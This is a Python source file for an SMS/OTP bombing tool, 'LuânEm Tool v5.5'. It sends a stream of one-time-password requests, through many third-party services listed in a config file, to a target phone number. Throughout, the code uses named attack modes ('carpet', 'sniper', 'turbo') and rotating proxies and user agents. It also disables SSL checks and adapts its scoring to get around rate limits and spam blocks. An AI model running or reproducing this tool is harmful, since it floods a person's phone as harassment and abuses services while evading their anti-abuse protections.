"""
LuânEm Tool v5.5 - Async OTP Engine with AI Smart Retry
Uses aiohttp for concurrent requests (5-10x faster)
AI learns which services work and prioritizes them
TURBO mode: no cooldown, max aggression
"""

import aiohttp
import asyncio
import json
import random
import time
import ssl

# Disable SSL warnings
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# User-Agent rotation pool
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36",
]


class SmartServiceTracker:
    """AI Smart Retry - learns which services work and prioritizes them"""

    def __init__(self):
        self.scores = {}         # service_name -> score (higher = better)
        self.fail_streak = {}    # service_name -> consecutive fails
        self.cooldowns = {}      # service_name -> cooldown_until timestamp
        self.response_times = {} # service_name -> avg response time ms
        self.total_success = {}  # service_name -> total successes ever
        self.total_fail = {}     # service_name -> total fails ever

    def init_service(self, name):
        if name not in self.scores:
            self.scores[name] = 50  # Start neutral
            self.fail_streak[name] = 0
            self.response_times[name] = 500
            self.total_success[name] = 0
            self.total_fail[name] = 0

    def record_success(self, name, response_time_ms):
        self.init_service(name)
        self.scores[name] = min(100, self.scores[name] + 12)
        self.fail_streak[name] = 0
        self.total_success[name] += 1
        # Smooth average response time
        self.response_times[name] = (self.response_times[name] * 0.7) + (response_time_ms * 0.3)

    def record_fail(self, name, is_dns_error=False, is_blocked=False):
        self.init_service(name)
        self.fail_streak[name] += 1
        self.total_fail[name] += 1

        if is_dns_error:
            # DNS = completely dead
            self.scores[name] = max(0, self.scores[name] - 40)
            self.cooldowns[name] = time.time() + 180  # 3 min
        elif is_blocked:
            # Blocked but might recover
            self.scores[name] = max(0, self.scores[name] - 10)
            self.cooldowns[name] = time.time() + 30   # 30s cooldown
        else:
            self.scores[name] = max(0, self.scores[name] - 3)

        # 5+ consecutive fails -> temp cooldown
        if self.fail_streak[name] >= 5:
            self.cooldowns[name] = time.time() + 60  # 1 min

    def is_on_cooldown(self, name):
        if name in self.cooldowns:
            return time.time() < self.cooldowns[name]
        return False

    def get_sorted_services(self, services, turbo=False):
        """Sort services by AI score (highest first), filter out cooldowns"""
        active = []
        for s in services:
            name = s.get("name", "Unknown")
            self.init_service(name)
            if turbo or not self.is_on_cooldown(name):
                active.append(s)

        # Sort by score descending
        active.sort(key=lambda s: self.scores.get(s["name"], 50), reverse=True)
        return active

    def clear_cooldowns(self):
        """Reset all cooldowns"""
        self.cooldowns.clear()

    def get_stats(self):
        """Return AI brain state"""
        return {
            name: {
                "score": self.scores[name],
                "streak": self.fail_streak.get(name, 0),
                "cooldown": self.is_on_cooldown(name),
                "avg_ms": int(self.response_times.get(name, 0)),
                "ok": self.total_success.get(name, 0),
                "fail": self.total_fail.get(name, 0)
            }
            for name in self.scores
        }


class SpamOTP:
    def __init__(self, phone, proxies=None, attack_mode='carpet'):
        self.phone = phone
        if self.phone.startswith('0'):
            self.phone_raw = self.phone[1:]
        else:
            self.phone_raw = self.phone
        self.proxies = proxies or []
        self.attack_mode = attack_mode  # carpet, sniper, turbo
        self.services = self.load_services()
        self.log = print
        self.tracker = SmartServiceTracker()
        self.batch_count = 0

    def load_services(self):
        try:
            with open('services.json', 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return []

    def get_headers(self):
        return {
            "user-agent": random.choice(USER_AGENTS),
            "accept": "*/*",
            "accept-language": "vi-VN,vi;q=0.9,en;q=0.8",
        }

    def format_payload(self, payload):
        if isinstance(payload, dict):
            result = {}
            for k, v in payload.items():
                if isinstance(v, str):
                    result[k] = v.replace("{phone}", self.phone).replace("{phone_raw}", self.phone_raw)
                else:
                    result[k] = v
            return result
        elif isinstance(payload, str):
            return payload.replace("{phone}", self.phone).replace("{phone_raw}", self.phone_raw)
        return payload

    def validate_response(self, text, status_code, service_name):
        """Validate response and return (success, short_message)"""
        if status_code != 200:
            return False, f"{service_name}: HTTP {status_code}"

        text_lower = text.lower()
        success_kw = ["success", "thành công", "đã gửi", "sent", "true", '"code":0', '"code": 0', '"status":1', "ok", "otp"]
        error_kw = ["error", "lỗi", "fail", "block", "spam", "limit", "too many", "thử lại", "false", '"code":1', '"code":-1']

        for kw in error_kw:
            if kw in text_lower:
                return False, f"{service_name} ✗ blocked"

        for kw in success_kw:
            if kw in text_lower:
                return True, f"{service_name} ✓ OK"

        return False, f"{service_name}: no match"

    async def send_one(self, session, service):
        """Send a single OTP request asynchronously"""
        name = service.get("name", "Unknown")
        url = service.get("url", "")
        url = url.replace("{phone}", self.phone).replace("{phone_raw}", self.phone_raw)
        method = service.get("method", "POST").upper()

        headers = self.get_headers()
        if "headers" in service:
            headers.update(service["headers"])

        kwargs: dict = {"headers": headers, "timeout": aiohttp.ClientTimeout(total=6), "ssl": ssl_context}

        # Proxy
        if self.proxies:
            proxy = random.choice(self.proxies)
            if not proxy.startswith("http"):
                proxy = f"http://{proxy}"
            kwargs["proxy"] = proxy

        start_time = time.time()

        try:
            if method == "GET":
                async with session.get(url, **kwargs) as resp:
                    text = await resp.text()
                    elapsed = int((time.time() - start_time) * 1000)
                    success, msg = self.validate_response(text, resp.status, name)
            else:
                if "json" in service:
                    kwargs["json"] = self.format_payload(service["json"])
                if "data" in service:
                    kwargs["data"] = self.format_payload(service["data"])

                async with session.post(url, **kwargs) as resp:
                    text = await resp.text()
                    elapsed = int((time.time() - start_time) * 1000)
                    success, msg = self.validate_response(text, resp.status, name)

            # AI tracking
            if success:
                self.tracker.record_success(name, elapsed)
            else:
                is_blocked = any(kw in msg.lower() for kw in ["block", "limit", "403", "429"])
                self.tracker.record_fail(name, is_blocked=is_blocked)

            self.log(f"{msg} ({elapsed}ms)")
            return success

        except asyncio.TimeoutError:
            self.tracker.record_fail(name)
            self.log(f"{name} ✗ timeout")
            return False
        except aiohttp.ClientConnectorError:
            self.tracker.record_fail(name, is_dns_error=True)
            self.log(f"{name} ✗ DNS dead")
            return False
        except Exception as e:
            err_msg = str(e)[:40]
            self.tracker.record_fail(name)
            self.log(f"{name} ✗ {err_msg}")
            return False

    async def run_batch_async(self, delay=2.0):
        """Run one batch of all services concurrently"""
        self.batch_count += 1
        is_turbo = (self.attack_mode == 'turbo')

        # AI Smart Retry: sort by score, filter cooldowns
        services = self.tracker.get_sorted_services(self.services, turbo=is_turbo)

        if self.attack_mode == 'sniper':
            # Sniper: only top 10 scoring services
            services = services[:10]

        if not services:
            self.log("⏸ All on cooldown. Resetting in 15s...")
            await asyncio.sleep(15)
            self.tracker.clear_cooldowns()
            return

        # Turbo: send all at once. Others: randomize order
        if not is_turbo:
            random.shuffle(services)

        # Rotate identity every 5 batches
        if self.batch_count % 5 == 0:
            self.log("🔄 Identity rotated")

        # Send ALL requests concurrently - higher limit for more services
        connector = aiohttp.TCPConnector(limit=50, ssl=ssl_context)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.send_one(session, s) for s in services]
            results = await asyncio.gather(*tasks, return_exceptions=True)

        successes = sum(1 for r in results if r is True)
        total = len(results)
        skipped = len(self.services) - len(services)

        mode_label = self.attack_mode.upper()
        if skipped > 0:
            self.log(f"🧠 AI: {skipped} cooldown, {total} active")

        self.log(f"📊 Batch #{self.batch_count}: {successes}/{total} OK [{mode_label}]")

    def run_batch(self, delay=2.0):
        """Sync wrapper for async batch"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.run_batch_async(delay))
        finally:
            loop.close()

    def start_loop(self, running_flag, delay=2.0):
        """Main loop - runs batches until stopped"""
        while running_flag():
            self.run_batch(delay)
            # Turbo mode: minimal delay
            actual_delay = max(0.3, delay * 0.3) if self.attack_mode == 'turbo' else delay
            time.sleep(actual_delay)
